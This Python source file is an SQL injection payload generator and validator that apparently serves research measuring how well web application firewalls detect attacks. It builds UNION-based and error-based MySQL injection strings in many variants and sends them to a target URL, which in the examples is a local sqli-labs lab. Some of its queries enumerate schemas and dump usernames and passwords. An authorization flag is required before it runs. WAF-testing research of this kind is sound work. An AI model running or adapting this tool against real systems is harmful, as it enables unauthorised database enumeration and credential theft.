"""
tools/payload_builder.py
=========================
Generate and validate SQLi payloads (UNION + error-based) with strict
markers and a configurable variant matrix.

Workflow (BWAFSQLi-style):
    1. Generate candidate payloads by Cartesian product over:
         UNION axes:
           - injection context  (numeric / single_quote / paren_single / ...)
           - column count       (2..6)
           - marker placement   (left=1/right=N or left=2/right=N)
           - extraction tier    (trivial / medium / complex)
           - comment style      (-- - / # / --+)
           - UNION keyword      (plain / all / distinct / distinctrow)
         Error axes:
           - injection context
           - error function     (extractvalue / updatexml / floor / exp / gtid_subset)
           - extraction tier    (trivial / medium / complex)
           - comment style
    2. Send each candidate to the backend WITHOUT WAF protection.
    3. Keep only payloads whose response reflects the expected signal:
         - union: both SEQSQLI_START and SEQSQLI_END markers
         - error: the function-specific SQL error signature
    4. Persist the validated set to CSV for downstream FNR0 / IFNR /
       SPBARC measurement.

USAGE
-----
    # UNION only — full variant matrix, single tier:
    python -m tools.payload_builder \
        --injection-types union \
        --url "http://localhost/sqli-labs/Less-1/" --param id \
        --contexts single_quote --columns 3 \
        --tiers trivial \
        --output payloads_union_less1.csv \
        --confirm-authorized-lab

    # ERROR-based — all 5 functions, all 3 tiers:
    python -m tools.payload_builder \
        --injection-types error \
        --url "http://localhost/sqli-labs/Less-1/" --param id \
        --contexts single_quote \
        --error-funcs extractvalue,updatexml,floor,exp,gtid_subset \
        --tiers trivial,medium,complex \
        --output payloads_error_less1.csv \
        --confirm-authorized-lab

    # COMBINED union + error in one CSV:
    python -m tools.payload_builder \
        --injection-types union,error \
        --url "http://localhost/sqli-labs/Less-1/" --param id \
        --contexts single_quote --columns 3 \
        --tiers trivial,medium,complex \
        --output payloads_combined_less1.csv \
        --confirm-authorized-lab

    # Generate-only (no HTTP probes):
    python -m tools.payload_builder \
        --injection-types union,error \
        --contexts single_quote --columns 3 --tiers trivial \
        --generate-only --output candidates.csv \
        --confirm-authorized-lab

The --confirm-authorized-lab flag is required to remind users that this
tool actively probes a backend and must only be run against a system
the operator owns or has explicit authorization to test.
"""

from __future__ import annotations

import argparse
import csv
import sys
import time
from dataclasses import dataclass, asdict
from typing import Iterator, List

from seqsqli.core.response import STRICT_MARKERS, has_strict_markers


# ---------------------------------------------------------------------------
# Context templates (shared by UNION and ERROR)
# ---------------------------------------------------------------------------
# UNION uses negative prefix (-1) so the original SELECT returns empty and
# the UNION result reflects through. ERROR uses positive prefix (1) since
# the error supersedes any returned data.
CONTEXTS = {
    "numeric":       {"prefix_union": "-1 ",     "prefix_error": "1 "},
    "single_quote":  {"prefix_union": "-1' ",    "prefix_error": "1' "},
    "double_quote":  {"prefix_union": "-1\" ",   "prefix_error": "1\" "},
    "paren_single":  {"prefix_union": "-1') ",   "prefix_error": "1') "},
    "paren_double":  {"prefix_union": "-1\") ",  "prefix_error": "1\") "},
    "paren2_single": {"prefix_union": "-1')) ",  "prefix_error": "1')) "},
}

COMMENT_STYLES = {
    "dash":     "-- -",
    "hash":     "#",
    "dashplus": "--+",
}

# ---------------------------------------------------------------------------
# UNION axis — lexical variants of the UNION operator
# ---------------------------------------------------------------------------
# All four are semantically equivalent for our marker-reflection test but
# trigger different ModSecurity rules / scores.
UNION_KEYWORDS = {
    "plain":       "UNION SELECT",
    "all":         "UNION ALL SELECT",
    "distinct":    "UNION DISTINCT SELECT",
    "distinctrow": "UNION DISTINCTROW SELECT",
}

# ---------------------------------------------------------------------------
# ERROR axis — error-triggering functions
# ---------------------------------------------------------------------------
# Each entry pairs a payload template (with {extract} placeholder for the
# extraction expression) with the lowercase error signature we expect to
# see in the response if the payload executed and triggered the error.
ERROR_FUNCTIONS = {
    "extractvalue": {
        "template":  "EXTRACTVALUE(1,CONCAT(0x7e,({extract}),0x7e))",
        "signature": "xpath syntax error",
        "min_mysql": "5.1",
    },
    "updatexml": {
        "template":  "UPDATEXML(1,CONCAT(0x7e,({extract}),0x7e),1)",
        "signature": "xpath syntax error",
        "min_mysql": "5.1",
    },
    "floor": {
        "template":  ("(SELECT 1 FROM (SELECT COUNT(*),"
                      "CONCAT(({extract}),0x7e,FLOOR(RAND(0)*2))x "
                      "FROM information_schema.tables GROUP BY x)a)"),
        "signature": "duplicate entry",
        "min_mysql": "5.0",
    },
    "exp": {
        "template":  "EXP(~(SELECT * FROM (SELECT ({extract}))a))",
        "signature": "double value is out of range",
        "min_mysql": "5.5",
    },
    "gtid_subset": {
        "template":  "GTID_SUBSET(({extract}),1)",
        "signature": "malformed gtid",
        "min_mysql": "5.6",
    },
}

# Generic SQL error signatures — accepted as a weaker fallback if the
# function-specific signature isn't found but a SQL error clearly fired.
ERROR_FALLBACK_SIGS = [
    "you have an error in your sql syntax",
    "warning: mysql",
    "warning: mysqli",
]

# ---------------------------------------------------------------------------
# Extraction tier — gradient of complexity / WAF keyword density
# ---------------------------------------------------------------------------
# trivial : single built-in function (low keyword density)
# medium  : information_schema enumeration (subquery + metadata table)
# complex : real data dump from sqli-labs `users` table (multiple keywords)
EXTRACTION_TIERS = {
    "trivial": [
        "database()",
        "user()",
        "version()",
    ],
    "medium": [
        ("(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables "
         "WHERE table_schema=database())"),
        "(SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata)",
        ("(SELECT GROUP_CONCAT(column_name) FROM information_schema.columns "
         "WHERE table_schema=database() LIMIT 5)"),
    ],
    "complex": [
        "(SELECT GROUP_CONCAT(username,0x3a,password) FROM users)",
        ("(SELECT GROUP_CONCAT(table_schema,0x2e,table_name) "
         "FROM information_schema.tables WHERE table_schema "
         "NOT IN (0x696e666f726d6174696f6e5f736368656d61,"
         "0x6d7973716c,0x706572666f726d616e63655f736368656d61))"),
        ("(SELECT CONCAT(0x7c,GROUP_CONCAT(DISTINCT table_name),0x7c) "
         "FROM information_schema.tables WHERE table_schema=DATABASE())"),
    ],
}


# ---------------------------------------------------------------------------
# PayloadSpec + CSV schema
# ---------------------------------------------------------------------------

@dataclass
class PayloadSpec:
    payload_id:           str
    payload:              str
    injection_type:       str            # "union" | "error"
    tier:                 str            # "trivial" | "medium" | "complex"
    context:              str
    columns:              int = 0        # union only
    comment_style:        str = ""
    marker_column_left:   int = 0        # union only
    marker_column_right:  int = 0        # union only
    extraction_expr:      str = ""
    union_keyword:        str = ""       # plain/all/distinct/distinctrow
    error_function:       str = ""       # extractvalue/updatexml/floor/exp/gtid_subset
    valid_without_waf:    str = ""       # filled after probing
    status_code:          str = ""
    response_len:         str = ""
    notes:                str = ""


FIELDNAMES = [
    "payload_id", "payload", "injection_type", "tier",
    "context", "columns", "comment_style",
    "marker_column_left", "marker_column_right",
    "extraction_expr", "union_keyword", "error_function",
    "valid_without_waf", "status_code", "response_len", "notes",
]


# ---------------------------------------------------------------------------
# UNION payload builder
# ---------------------------------------------------------------------------

def _build_union_select_clause(columns: int,
                               marker_left: int,
                               marker_right: int,
                               extraction_expr: str) -> str:
    """Build the column list for UNION SELECT.

    marker_left and marker_right columns emit the SEQSQLI markers;
    the first column that is NEITHER emits the extraction expression;
    remaining columns emit their index as a placeholder.
    """
    start_m, end_m = STRICT_MARKERS
    parts: List[str] = []
    extract_col = None
    for c in range(1, columns + 1):
        if c != marker_left and c != marker_right:
            extract_col = c
            break
    for c in range(1, columns + 1):
        if c == marker_left:
            parts.append(f"'{start_m}'")
        elif c == marker_right:
            parts.append(f"'{end_m}'")
        elif c == extract_col:
            parts.append(extraction_expr)
        else:
            parts.append(str(c))
    return ",".join(parts)


def generate_union_candidates(columns_list: List[int],
                              contexts: List[str],
                              comment_styles: List[str],
                              tiers: List[str],
                              union_variants: List[str]) -> Iterator[PayloadSpec]:
    """Yield UNION-based PayloadSpec over the full variant matrix."""
    pid = 0
    for ctx_name in contexts:
        if ctx_name not in CONTEXTS:
            print(f"[!] Unknown context '{ctx_name}', skipping.")
            continue
        ctx = CONTEXTS[ctx_name]
        for n_cols in columns_list:
            if n_cols < 2:
                continue
            placements = [(1, n_cols)]
            if n_cols >= 3:
                placements.append((2, n_cols))
            for m_left, m_right in placements:
                if m_left == m_right:
                    continue
                for tier_name in tiers:
                    if tier_name not in EXTRACTION_TIERS:
                        continue
                    for ext_expr in EXTRACTION_TIERS[tier_name]:
                        for cs_name in comment_styles:
                            if cs_name not in COMMENT_STYLES:
                                continue
                            suffix = COMMENT_STYLES[cs_name]
                            for uk_name in union_variants:
                                if uk_name not in UNION_KEYWORDS:
                                    continue
                                union_kw = UNION_KEYWORDS[uk_name]
                                cols_clause = _build_union_select_clause(
                                    n_cols, m_left, m_right, ext_expr,
                                )
                                payload = (
                                    f"{ctx['prefix_union']}{union_kw} "
                                    f"{cols_clause}{suffix}"
                                )
                                pid += 1
                                yield PayloadSpec(
                                    payload_id=f"u{pid:04d}",
                                    payload=payload,
                                    injection_type="union",
                                    tier=tier_name,
                                    context=ctx_name,
                                    columns=n_cols,
                                    comment_style=cs_name,
                                    marker_column_left=m_left,
                                    marker_column_right=m_right,
                                    extraction_expr=ext_expr,
                                    union_keyword=uk_name,
                                )


# ---------------------------------------------------------------------------
# ERROR payload builder
# ---------------------------------------------------------------------------

def generate_error_candidates(contexts: List[str],
                              comment_styles: List[str],
                              error_funcs: List[str],
                              tiers: List[str]) -> Iterator[PayloadSpec]:
    """Yield error-based PayloadSpec over the full variant matrix."""
    pid = 0
    for ctx_name in contexts:
        if ctx_name not in CONTEXTS:
            print(f"[!] Unknown context '{ctx_name}', skipping.")
            continue
        ctx = CONTEXTS[ctx_name]
        for ef_name in error_funcs:
            if ef_name not in ERROR_FUNCTIONS:
                print(f"[!] Unknown error function '{ef_name}', skipping.")
                continue
            ef = ERROR_FUNCTIONS[ef_name]
            for tier_name in tiers:
                if tier_name not in EXTRACTION_TIERS:
                    continue
                for ext_expr in EXTRACTION_TIERS[tier_name]:
                    for cs_name in comment_styles:
                        if cs_name not in COMMENT_STYLES:
                            continue
                        suffix = COMMENT_STYLES[cs_name]
                        err_clause = ef["template"].format(extract=ext_expr)
                        payload = (
                            f"{ctx['prefix_error']}AND {err_clause}{suffix}"
                        )
                        pid += 1
                        yield PayloadSpec(
                            payload_id=f"e{pid:04d}",
                            payload=payload,
                            injection_type="error",
                            tier=tier_name,
                            context=ctx_name,
                            comment_style=cs_name,
                            extraction_expr=ext_expr,
                            error_function=ef_name,
                        )


# ---------------------------------------------------------------------------
# Validation against backend (no WAF)
# ---------------------------------------------------------------------------

def _validate_payload(url: str, param: str, spec: PayloadSpec,
                      timeout: float, delay: float) -> PayloadSpec:
    """Send one candidate to the backend, set valid_without_waf accordingly.

    UNION: success = both SEQSQLI markers reflected.
    ERROR: success = the function's signature string appears in response,
           or as a weaker fallback, any generic MySQL error signature.
    """
    import requests
    import urllib.parse

    encoded = urllib.parse.quote(spec.payload, safe="-_.~!*()+,;:@/=&")
    sep = "&" if "?" in url else "?"
    full_url = f"{url}{sep}{param}={encoded}"

    try:
        resp = requests.get(full_url, timeout=timeout, allow_redirects=True)
        status = resp.status_code
        text = resp.text
        spec.status_code  = str(status)
        spec.response_len = str(len(text))
        text_lower = text.lower()

        if spec.injection_type == "union":
            if has_strict_markers(text):
                spec.valid_without_waf = "yes"
            else:
                spec.valid_without_waf = "no"
                if "error" in text_lower and "sql" in text_lower:
                    spec.notes = "sql_error"
                elif status >= 500:
                    spec.notes = "server_error"
                elif spec.payload.count(",") != spec.columns - 1:
                    spec.notes = "column_count_mismatch"
                else:
                    spec.notes = "no_marker_reflected"

        else:  # error-based
            ef = ERROR_FUNCTIONS.get(spec.error_function, {})
            sig = ef.get("signature", "")
            if sig and sig in text_lower:
                spec.valid_without_waf = "yes"
            elif any(fb in text_lower for fb in ERROR_FALLBACK_SIGS):
                spec.valid_without_waf = "yes"
                spec.notes = "generic_sql_error_not_specific_signature"
            else:
                spec.valid_without_waf = "no"
                if status >= 500:
                    spec.notes = "server_error_no_error_string"
                else:
                    spec.notes = "no_error_signature_in_response"

    except requests.exceptions.Timeout:
        spec.valid_without_waf = "no"
        spec.status_code = "408"
        spec.notes = "timeout"
    except Exception as e:
        spec.valid_without_waf = "no"
        spec.status_code = "exception"
        spec.notes = f"err:{type(e).__name__}"

    time.sleep(delay)
    return spec


# ---------------------------------------------------------------------------
# IO
# ---------------------------------------------------------------------------

def write_csv(path: str, specs: List[PayloadSpec]) -> None:
    with open(path, "w", newline="", encoding="utf-8") as f:
        writer = csv.DictWriter(f, fieldnames=FIELDNAMES)
        writer.writeheader()
        for s in specs:
            writer.writerow({k: asdict(s)[k] for k in FIELDNAMES})


def _parse_int_list(s: str) -> List[int]:
    """Parse '2,3,4' or '2-5' into [2,3,4] or [2,3,4,5]."""
    if "-" in s and "," not in s:
        lo, hi = s.split("-", 1)
        return list(range(int(lo), int(hi) + 1))
    return [int(x) for x in s.split(",") if x.strip()]


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------

def main():
    parser = argparse.ArgumentParser(
        description="Generate and validate SQLi payloads (UNION + error-based) "
                    "with strict markers and configurable variant axes.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    parser.add_argument("--injection-types", type=str, default="union",
                        help="Comma list of injection types to generate. "
                             "Choices: union, error. Default: union.")
    parser.add_argument("--url", type=str,
                        help="Target URL of vulnerable backend WITHOUT WAF. "
                             "Required unless --generate-only is set.")
    parser.add_argument("--param", type=str, default="id",
                        help="Vulnerable parameter name (default: id)")
    parser.add_argument("--columns", type=str, default="3",
                        help="UNION column count(s). Comma list or range "
                             "(e.g. '3', '2,3,4', '2-5'). Ignored for "
                             "error-based. Default: 3.")
    parser.add_argument("--contexts", type=str, default="single_quote",
                        help=f"Comma list. Available: {','.join(CONTEXTS.keys())}. "
                             "Default: single_quote.")
    parser.add_argument("--comment-styles", type=str, default="dash,hash,dashplus",
                        help=f"Comma list. Available: {','.join(COMMENT_STYLES.keys())}.")
    parser.add_argument("--tiers", type=str, default="trivial",
                        help=f"Extraction-tier comma list. Available: "
                             f"{','.join(EXTRACTION_TIERS.keys())}. Default: trivial.")
    parser.add_argument("--union-variants", type=str,
                        default="plain,all,distinct,distinctrow",
                        help=f"Comma list. Available: {','.join(UNION_KEYWORDS.keys())}. "
                             "Used only when 'union' is in --injection-types.")
    parser.add_argument("--error-funcs", type=str,
                        default="extractvalue,updatexml,floor,exp,gtid_subset",
                        help=f"Comma list. Available: {','.join(ERROR_FUNCTIONS.keys())}. "
                             "Used only when 'error' is in --injection-types.")
    parser.add_argument("--output", type=str, default="payloads.csv",
                        help="Output CSV path (validated set).")
    parser.add_argument("--all-candidates-output", type=str, default=None,
                        help="(Optional) Write ALL candidates (valid+invalid) "
                             "to this CSV for diagnostics.")
    parser.add_argument("--generate-only", action="store_true",
                        help="Skip validation; emit candidate CSV only.")
    parser.add_argument("--timeout", type=float, default=5.0)
    parser.add_argument("--delay", type=float, default=0.05,
                        help="Seconds between probes (rate limit hygiene).")
    parser.add_argument("--max-candidates", type=int, default=0,
                        help="Truncate candidate set (0 = no limit).")
    parser.add_argument("--confirm-authorized-lab", action="store_true",
                        help="REQUIRED to actually run. Reminds operator that "
                             "this script probes a backend and must only be "
                             "used on systems they own or have authorization "
                             "to test.")
    args = parser.parse_args()

    if not args.confirm_authorized_lab:
        print("[!] --confirm-authorized-lab is required.\n"
              "    This tool actively probes a backend with SQLi payloads.\n"
              "    Use only against systems you own or have explicit\n"
              "    authorization to test.")
        sys.exit(2)

    if not args.generate_only and not args.url:
        print("[!] --url is required unless --generate-only is set.")
        sys.exit(2)

    inj_types      = [t.strip().lower() for t in args.injection_types.split(",") if t.strip()]
    columns_list   = _parse_int_list(args.columns)
    contexts       = [c.strip() for c in args.contexts.split(",") if c.strip()]
    comment_styles = [c.strip() for c in args.comment_styles.split(",") if c.strip()]
    tiers          = [t.strip() for t in args.tiers.split(",") if t.strip()]
    union_variants = [v.strip() for v in args.union_variants.split(",") if v.strip()]
    error_funcs    = [f.strip() for f in args.error_funcs.split(",") if f.strip()]

    print("=" * 60)
    print(" SeqSQLi Payload Builder")
    print(f" Injection types : {inj_types}")
    print(f" Contexts        : {contexts}")
    print(f" Comments        : {comment_styles}")
    print(f" Tiers           : {tiers}")
    if "union" in inj_types:
        print(f" Columns         : {columns_list}")
        print(f" UNION variants  : {union_variants}")
    if "error" in inj_types:
        print(f" Error funcs     : {error_funcs}")
    print(f" Mode            : {'generate-only' if args.generate_only else 'validate-against-backend'}")
    if not args.generate_only:
        print(f" Target          : {args.url} (param={args.param})")
    print("=" * 60)

    # ---- Generate candidates ----
    candidates: List[PayloadSpec] = []
    if "union" in inj_types:
        candidates.extend(generate_union_candidates(
            columns_list, contexts, comment_styles, tiers, union_variants,
        ))
    if "error" in inj_types:
        candidates.extend(generate_error_candidates(
            contexts, comment_styles, error_funcs, tiers,
        ))

    if not candidates:
        print("[!] No candidates generated. Check --injection-types and axis flags.")
        sys.exit(1)

    if args.max_candidates > 0:
        candidates = candidates[: args.max_candidates]

    # Breakdown
    by_type: dict = {}
    for c in candidates:
        by_type[c.injection_type] = by_type.get(c.injection_type, 0) + 1
    print(f"[*] Generated {len(candidates)} candidates")
    for t, n in sorted(by_type.items()):
        print(f"      {t:<8} : {n}")

    if args.generate_only:
        write_csv(args.output, candidates)
        print(f"[*] Wrote {len(candidates)} candidates to {args.output}")
        return

    # ---- Validate each candidate ----
    valid: List[PayloadSpec] = []
    for i, spec in enumerate(candidates, 1):
        spec = _validate_payload(args.url, args.param, spec,
                                 args.timeout, args.delay)
        if spec.valid_without_waf == "yes":
            valid.append(spec)
        if i % 20 == 0 or i == len(candidates):
            sr = len(valid) / i * 100
            print(f"  [{i:>4}/{len(candidates)}] valid={len(valid)} ({sr:.1f}%)")

    write_csv(args.output, valid)
    print(f"\n[*] Validated payloads: {len(valid)} / {len(candidates)} "
          f"({len(valid)/len(candidates)*100:.1f}%)")

    # Validated breakdown by type
    valid_by_type: dict = {}
    for v in valid:
        valid_by_type[v.injection_type] = valid_by_type.get(v.injection_type, 0) + 1
    for t, n in sorted(valid_by_type.items()):
        total_for_type = by_type.get(t, 0)
        sr = n / total_for_type * 100 if total_for_type else 0
        print(f"      {t:<8} : {n} / {total_for_type} ({sr:.1f}%)")

    print(f"[*] Wrote validated set to {args.output}")

    if args.all_candidates_output:
        write_csv(args.all_candidates_output, candidates)
        print(f"[*] Wrote all candidates (with diagnostics) to "
              f"{args.all_candidates_output}")


if __name__ == "__main__":
    main()